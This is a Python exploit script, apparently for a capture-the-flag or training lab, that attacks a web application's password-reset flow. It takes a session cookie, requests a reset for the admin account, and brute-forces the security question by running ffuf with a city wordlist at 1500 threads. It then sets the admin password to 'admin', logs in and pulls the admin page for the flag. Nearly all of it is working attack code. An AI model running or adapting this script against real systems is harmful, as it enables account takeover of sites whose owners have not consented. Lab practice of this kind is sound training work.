""" 
---------------------------
Vulnerable Password Reset
---------------------------
"""

# Import Request to send web request to the internet
import requests
import sys
import subprocess
import base64
import re
# Module to display output in different colors.
from colorama import Fore, Back, Style
"""
Disable the display of certificate warnings when requests 
are made to websites using insecure certificates. This can 
be useful in scenarios where targeted web applications use 
self-signed certificates as is the case in the AWAE labs.
"""
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
# Optional headers to mimic your Burp capture
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://{target}",
    "Referer": "http://{target}/",
    # don't set Content-Type here — requests will set the correct multipart boundary
}
    
def main():
    """
    Main entry point:
    - validate CLI args
    - build request info
    - simulate (or actually perform) the request
    - format and print the response blocks
    """
    # If the script is ran without specify the target
    if len(sys.argv) != 2:
        print(f"In CLI, Usage should be: {sys.argv[0]} target")
        print(f"Example: {sys.argv[0]} 10.0.0.1")
        print(f"Example: {sys.argv[0]} manageengine")
        sys.exit(1)

    # Obtain taregt from CLI
    target = sys.argv[1].strip().rstrip('/')   # from CLI202

    # ============================ TARGET URLs ============================ #
    intial_get_target_url = f"http://{target}"
    password_reset_url = f"http://{target}/reset.php"
    security_question_url = f"http://{target}/security_question.php"
    reset_password_url = f"http://{target}/reset_password.php"
    post_login_url = f"http://{target}/index.php"
    login_as_admin_url = f"http://{target}/admin.php"

    """
    Q1. Using the file inclusion find the name of a user on the system that starts with "b".
    """
    
    # 1. ============================ Initate Request to Reset Password ============================ #
    print("\n ############### Get the Intial Response ###############")
    intial_get_target_url = f"http://{target}"
    print(f"[+] Target URL: {intial_get_target_url}")
    # Upload File 
    intial_get_request_target = get_request(url=intial_get_target_url)
    # Obtain the PHPSESSID from the r.cookies
    # requests.Response.cookies is a RequestsCookieJar — use .get() to read a named cookie
    PHPSESSID = intial_get_request_target.cookies.get('PHPSESSID')
    print(f"[*] Obtained PHPSESSID: {PHPSESSID}")

    # Send POST Request to Reset Password
    admin_reset_post = post_request(url=password_reset_url, data={'username':'admin'}, cookies={'PHPSESSID':PHPSESSID})
    # Display upload Response
    print_response(admin_reset_post)
    
    # Send GET Request to get reset password question
    admin_reset_get = get_reset_pass_request(url=password_reset_url, cookies={'PHPSESSID':PHPSESSID})
    # Display upload Response
    print_response(admin_reset_get)

    # 2. ============================ Brute-Force Security Question using FFUF ============================ #
    print("\n ############### Brute-Force Security Question using FFUF ###############")

    # Initiate the FFUF scan using the custom city list created 
    # Command would look like this in terminal:
    # ffuf -w ./city_wordlist.txt -u http://94.237.48.51:48553/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=21i4no3lj41acap8607tfooa26" -d "security_response=FUZZ" -fr "Incorrect response." -t 500
    print("FFUF SCAN TO BE RAN: ")
    print(f"ffuf -w ./city_wordlist.txt -u http://{target}/security_question.php -X POST -H 'Content-Type: application/x-www-form-urlencoded' -b 'PHPSESSID={PHPSESSID}' -d 'security_response=FUZZ' -fr 'Incorrect response.' -t 500")
    initate_ffuf_scan = subprocess.run(['ffuf', '-w', 'city_wordlist.txt', '-u', f'http://{target}/security_question.php', '-X', 'POST', '-H', 'Content-Type: application/x-www-form-urlencoded', '-b', f'PHPSESSID={PHPSESSID}', '-d', 'security_response=FUZZ', '-fr', 'Incorrect response.', '-t', '1500'], capture_output=True, text=True)
  
    # print scan result
    print("\n ############### FFUF Scan Result ###############")
    print(initate_ffuf_scan.stdout)
    output = f"{initate_ffuf_scan.stdout}"

    for line in output.strip().splitlines():
        print(f"LINE: {line}")
        line = line.strip('\x1b[2K')
        print(f"STRIPPED LINE: {line.split()}")
        security_question_answer = line.split()[0]
        print(f"[*] Found Security Answer: {security_question_answer}")
        break

    # 3. ============================ Send POST Request of FFUF Results to Security Question URL ============================ #
    post_password_reset = post_request(url=security_question_url, data={'security_response':security_question_answer}, cookies={'PHPSESSID':PHPSESSID})
    # Display Security Response
    print_response(post_password_reset)

    # 4. ============================ Send Post Request to reset password ============================ #
    reset_password_post = post_request(url=reset_password_url, data={'password':'admin'}, cookies={'PHPSESSID':PHPSESSID})
    # Display Password Reset Response
    print_response(reset_password_post)

    # 5. ============================ Send POST Request to Login as Admin ============================ #
    print("\n ############### RETRIEVE FLAG ###############")
    post_as_admin = post_request(url=post_login_url, data={'username':'admin', 'password':'admin'}, cookies={'PHPSESSID':PHPSESSID})
    print_response(post_as_admin)

    # 6. ============================ Retrieve Flag ============================ #
    print("\n ############### FLAG and ADMIN LOGIN ###############")
    login_as_admin_url = get_admin_login_request(url=login_as_admin_url, cookies={'PHPSESSID':PHPSESSID})
    print_response(login_as_admin_url)



def get_request(url):
    # ============================ Initiate the Request to Execute Local File Inclusion  ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.get(url, headers={"User-Agent": HEADERS["User-Agent"]}, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)   
    # return response to upload 
    return r

def get_reset_pass_request(url, cookies):
    # ============================ Initiate the Request to Get Reset Password Question  ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.get(url, headers={"User-Agent": HEADERS["User-Agent"]}, cookies=cookies, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)   
    # return response to upload 
    return r

def get_admin_login_request(url, cookies):
    # ============================ Initiate the Request to Login as Admin  ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.get(url, headers={"User-Agent": HEADERS["User-Agent"]}, cookies=cookies, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)   
    # return response to upload 
    return r

def post_request(url, data, cookies):
    # ============================ Initiate the POST Request to Reset Password  ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.post(url, headers={"User-Agent": HEADERS["User-Agent"]}, data=data, cookies=cookies, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)   
    # return response to upload 
    return r

def retrieve_flag(url):
    # ============================ Initiate the Request to Get Flag ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.get(url, headers={"User-Agent": HEADERS["User-Agent"]}, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)
    # return response to with flag
    return r

def print_response_base64(response):
    resp_text = response.text  # from requests
    m = re.search(r'<svg[^>]*>(.*?)</svg>', resp_text, re.S | re.I)
    if not m:
        raise SystemExit("No <svg>...</svg> block found")

    b64 = m.group(1).strip()            # inner text
    # optional sanity check
    if not re.match(r'^[A-Za-z0-9+/=\\s]+$', b64):
        print("Warning: extracted content contains non-base64 chars; proceeding anyway")

    decoded = base64.b64decode(b64)
    print(decoded.decode('utf-8', errors='replace'))

def print_response(response):
    r = response
    # ============================ FORMAT OUTPUT ============================ #
    print("\n======= Custom Exploit Development =======\n")
    print(format_text("REQUEST METHOD:", r.request.method))
    print(format_text("REQUEST URL:", r.request.url))
    print(format_text("REQUEST HEADERS,r.headers is: :", r.request.headers))
    print(format_text("REQUEST BODY (raw):", r.request.body))   # shows form-encoded body
    print(format_text("RESPONSE STATUS,r.status_code is:", r.status_code))
    print(format_text("RESPONSE COOKIES,r.cookies is:", r.cookies))
    print(format_text("RESPONSE CONTENT-LENGTH:", len(r.text)))
    print(format_text("RESPONSE:\n", r.text))

def format_text(title,item):
  """
    Helper to create a nicely formatted console output block.

    - title: short label for the section (e.g. "r.status_code is:")
    - item: item to display (will be stringified)
    Returns a string that contains the title, a separator, the item, and a short marker.
  """
  cr = '\r\n'
  section_break = cr +  "*" * 20 + cr
  item = str(item)
  text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break + '\t'
  return text

if __name__ == "__main__":
    main()